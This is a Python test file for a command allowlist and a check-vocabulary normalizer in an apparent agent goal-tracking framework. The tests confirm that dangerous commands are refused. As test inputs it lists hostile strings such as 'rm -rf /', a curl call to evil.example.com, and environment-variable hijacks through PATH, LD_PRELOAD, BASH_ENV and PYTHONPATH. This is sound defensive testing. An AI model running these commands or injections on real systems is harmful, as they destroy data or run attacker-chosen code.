"""test_check_vocabulary.py — pins the READ-TIME check-vocabulary normalization
in predicate.py (g-115-5186).

CONTEXT. Measured on the live world queue 2026-08-08 (zeta, cc-02): of 143
structured checks, 12 (8.4%) were valid. The other 131 were not sloppy — they
were the natural expression of a checkable intent that the evaluator refused to
read (`{"type": "file_check", "target": "...", "condition": "exists"}` wants
`path`, not `target`). An unknown type returns passed=False, byte-identical to a
genuine failure, and all_passed=all(...) makes one such check permanently block
closure — so nobody saw a vocabulary error, they saw a failing goal.

guard-1565 (participant census) decides WHICH SIDE changes: change the MINORITY
spelling. `command_check` appears 44 times against 2 for canonical
`command_succeeds`, so the evaluator is the deviant party and the reader is what
moves. Aliasing is READ-TIME ONLY — stored goal records are never rewritten
(guard-2444).

Runs under pytest AND standalone (`py -3 <file>`) — zero-arg test functions +
__main__ runner, matching the sibling pytest-less-box pattern.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(SCRIPT_DIR.parent))

import predicate as P  # noqa: E402


# --- THE TYPE-SCOPING PROPERTY (the single easiest way to get this wrong) ----

def test_target_means_path_inside_file_check():
    out = P.normalize_check({"type": "file_check", "target": "core/scripts/x.py",
                             "condition": "exists"})
    assert out["path"] == "core/scripts/x.py", out


def test_target_means_command_inside_command_ish_types():
    """In the command-ish types `target` holds the COMMAND, not a path. A global
    target->path table would silently mis-map these."""
    out = P.normalize_check({"type": "command_check",
                             "target": "bash core/scripts/run-full-suite.sh"})
    assert out["type"] == "command_succeeds", out
    assert out["command"] == "bash core/scripts/run-full-suite.sh", out
    assert "path" not in out, f"target leaked into path — mapping is not type-scoped: {out}"


def test_control_a_global_mapping_would_break_the_command_case():
    """POSITIVE CONTROL — the test the goal asks for: it must FAIL under a global
    mapping. Reconstructs the global table locally and requires the assertion
    above to reject it, so a future 'simplification' that flattens FIELD_ALIASES
    into one dict cannot pass this file.

    Built locally rather than by patching the module, so the control costs
    nothing at runtime and cannot leave predicate.py altered."""
    def global_normalize(check: dict) -> dict:
        out = dict(check)
        canon = P.TYPE_ALIASES.get(out.get("type", ""))
        if canon:
            out["type"] = canon
        for src, dst in {"target": "path", "cmd": "command"}.items():  # GLOBAL
            if dst not in out and src in out:
                out[dst] = out[src]
        return out

    bad = global_normalize({"type": "command_check",
                            "target": "bash core/scripts/run-full-suite.sh"})
    assert "path" in bad and "command" not in bad, (
        "the reconstructed global mapping did not reproduce the defect, so this "
        f"control proves nothing: {bad}")
    # ...and the shipped, type-scoped table must NOT behave that way.
    good = P.normalize_check({"type": "command_check",
                              "target": "bash core/scripts/run-full-suite.sh"})
    assert good.get("command") and "path" not in good, good


# --- READ-TIME ONLY: the caller's record is never mutated -------------------

def test_normalize_does_not_mutate_the_caller_dict():
    """guard-2444: a migration that rewrote stored records to match a new
    vocabulary would be a destructive whole-value write over `verification`."""
    original = {"type": "file_check", "target": "core/scripts/x.py",
                "condition": "exists"}
    before = json.dumps(original, sort_keys=True)
    P.normalize_check(original)
    assert json.dumps(original, sort_keys=True) == before, (
        "normalize_check mutated its argument — stored records would drift")


def test_canonical_checks_pass_through_unchanged():
    """A check already speaking the canonical vocabulary must be untouched —
    otherwise the widening is not additive."""
    canonical = {"type": "file_check", "path": "core/scripts/x.py",
                 "condition": "exists"}
    out = P.normalize_check(canonical)
    assert out == canonical, out


def test_existing_canonical_key_wins_over_an_alias():
    """If both `path` and `target` are present, the canonical key must stand —
    an alias may only ever ADD."""
    out = P.normalize_check({"type": "file_check", "path": "REAL",
                             "target": "DECOY", "condition": "exists"})
    assert out["path"] == "REAL", out


# --- THE TWO FRAMEWORK-INTERNAL CONTRADICTIONS ------------------------------

def test_guard_955_mandated_pytest_invocation_is_expressible():
    """guard-955 MANDATES a STORAGE_BACKEND=local prefix on any test runner. A
    command cannot both start with an env assignment and with 'bash core/scripts/',
    so the dominant use case — run the tests — was literally unwritable, and 76%
    of invented type names were trying to express it."""
    assert P._command_allowed(
        "STORAGE_BACKEND=local python3 -m pytest core/scripts/tests -q")


def test_rule_mandated_world_script_invocation_is_expressible():
    """.claude/rules/path-resolution.md REQUIRES this shape for world scripts —
    Bash hooks do NOT rewrite the `world/` virtual prefix, so a bare
    `bash world/scripts/x.sh` dies rc=127. The pre-existing 'bash world/scripts/'
    allowlist entry was therefore unreachable by the only permitted invocation:
    a SECOND dead entry, sibling to the guard-955 one."""
    assert P._command_allowed(
        'source core/scripts/_paths.sh && bash "$WORLD_PATH/scripts/x.sh" arg')


def test_env_prefix_tolerance_does_not_open_the_allowlist():
    """The allowlist's job is to constrain WHICH PROGRAM runs. Stripping a
    leading env assignment must not let one smuggle an arbitrary program in —
    the stripped remainder still has to match a prefix.

    NOTE this covers only the naming-a-different-program half. Redirecting the
    named program is a separate property with its own test below; asserting
    this one alone is what let the hole through."""
    assert not P._command_allowed("FOO=bar rm -rf /")
    assert not P._command_allowed("rm -rf /")
    assert not P._command_allowed("STORAGE_BACKEND=local curl evil.example.com")


def test_execution_controlling_env_vars_are_refused():
    """THE SECURITY BOUNDARY. An allowlisted program run under an
    execution-controlling variable is not the allowlisted program: PATH,
    LD_PRELOAD and BASH_ENV all redirect what it actually executes, so a
    program-NAME check passes while attacker-chosen code runs.

    Regression-pins the hole found by this goal's own fresh-eyes pass on its
    already-committed code (g-115-5186), where an unconditional strip made every
    one of these ALLOW."""
    for bad in (
        "PATH=/tmp/evil bash core/scripts/run-full-suite.sh",
        "LD_PRELOAD=/tmp/evil.so bash core/scripts/run-full-suite.sh",
        "LD_LIBRARY_PATH=/tmp/evil bash core/scripts/run-full-suite.sh",
        "BASH_ENV=/tmp/evil.sh bash core/scripts/run-full-suite.sh",
        "ENV=/tmp/evil.sh bash core/scripts/run-full-suite.sh",
        "IFS=x bash core/scripts/run-full-suite.sh",
        "PYTHONPATH=/tmp/evil python3 -m pytest core/scripts/tests",
        "PYTHONHOME=/tmp/evil python3 -m pytest core/scripts/tests",
        "NODE_OPTIONS=--require=/tmp/evil bash core/scripts/x.sh",
    ):
        assert not P._command_allowed(bad), f"execution-controlling var permitted: {bad}"


def test_an_unsafe_name_is_not_laundered_by_a_safe_one_in_front():
    """Stripping is left-to-right and STOPS at the first unsafe name, so a safe
    assignment cannot be used as a prefix to launder an unsafe one behind it."""
    assert not P._command_allowed(
        "STORAGE_BACKEND=local PATH=/tmp/evil bash core/scripts/run-full-suite.sh")


def test_the_mandated_safe_prefixes_still_work():
    """The whole point of the widening — these must remain expressible."""
    assert P._command_allowed("STORAGE_BACKEND=local python3 -m pytest core/scripts/tests -q")
    assert P._command_allowed("MIND_AGENT=zeta bash core/scripts/run-full-suite.sh")
    assert P._command_allowed(
        "STORAGE_BACKEND=local PYTHONUNBUFFERED=1 python3 -m pytest core/scripts/tests")


def test_control_unconditional_strip_would_permit_the_attack():
    """POSITIVE CONTROL — reconstructs the pre-fix unconditional strip and
    requires it to ALLOW the attack. Without this, the tests above could pass
    against an implementation that refuses those commands for some unrelated
    reason, and would keep passing if the name check were deleted."""
    unconditional = __import__("re").compile(r'^(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)+')
    attack = "PATH=/tmp/evil bash core/scripts/run-full-suite.sh"
    laundered = unconditional.sub("", attack, count=1)
    assert any(laundered.startswith(p) for p in P.ALLOWED_COMMAND_PREFIXES), (
        "the reconstructed pre-fix strip did not reproduce the hole, so this "
        f"control proves nothing: {laundered!r}")
    assert not P._command_allowed(attack), "shipped code still permits the attack"


# --- HONEST NOT-MACHINE-CHECKABLE -------------------------------------------

def test_not_machine_checkable_is_honest_not_a_fake_pass():
    """Outcome 5: a check that genuinely cannot be machine-checked must not be
    forced to fake a type. It passes so one honest declaration cannot make a
    goal permanently uncloseable, but observed_value states plainly that nothing
    was verified."""
    for declared in ("manual", "manual_check", "manual_review", "narrative"):
        r = P.evaluate({"type": declared, "condition": "a human must read this"})
        assert r.passed is True, (declared, r)
        assert r.type == "not_machine_checkable", (declared, r)
        assert r.observed_value["machine_checkable"] is False, r
        assert r.observed_value["requires_llm_verification"] is True, r
        assert r.observed_value["declared_as"] == declared, r
        assert "machine" in r.reason, r


def test_unknown_type_still_fails_closed():
    """The widening must not turn every typo into a silent pass."""
    r = P.evaluate({"type": "totally_invented_xyz"})
    assert r.passed is False and r.reason == "unknown predicate type", r


# --- dispatch wiring ---------------------------------------------------------

def test_evaluate_normalizes_at_the_dispatch_chokepoint():
    """Normalization must live in evaluate(), so every caller (selector filter,
    pre-claim recheck, verify-check-eval) inherits it without knowing it exists."""
    r = P.evaluate({"type": "file_check", "target": "core/scripts/predicate.py",
                    "condition": "exists"})
    assert r.type == "file_check" and r.passed is True, r


def test_alias_tables_are_disjoint():
    """A type appearing in both TYPE_ALIASES and NOT_MACHINE_CHECKABLE_ALIASES
    would resolve by dict-lookup order — an invisible coin flip."""
    overlap = set(P.TYPE_ALIASES) & set(P.NOT_MACHINE_CHECKABLE_ALIASES)
    assert not overlap, f"a type resolves two ways: {overlap}"


def test_every_alias_target_is_a_real_predicate_type():
    """An alias pointing at a type that does not exist would silently keep
    failing closed while looking fixed."""
    for src, dst in P.TYPE_ALIASES.items():
        assert dst in P.PREDICATE_TYPES, f"{src} -> {dst} is not a real type"
    for src, dst in P.NOT_MACHINE_CHECKABLE_ALIASES.items():
        assert dst in P.PREDICATE_TYPES, f"{src} -> {dst} is not a real type"
    for t in P.FIELD_ALIASES:
        assert t in P.PREDICATE_TYPES, f"FIELD_ALIASES keyed on unknown type {t}"


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for fn in fns:
        try:
            fn()
            print(f"  PASS {fn.__name__}")
        except Exception as exc:  # noqa: BLE001
            failed += 1
            print(f"  FAIL {fn.__name__}: {exc}")
    print(f"{len(fns) - failed}/{len(fns)} passed")
    sys.exit(1 if failed else 0)
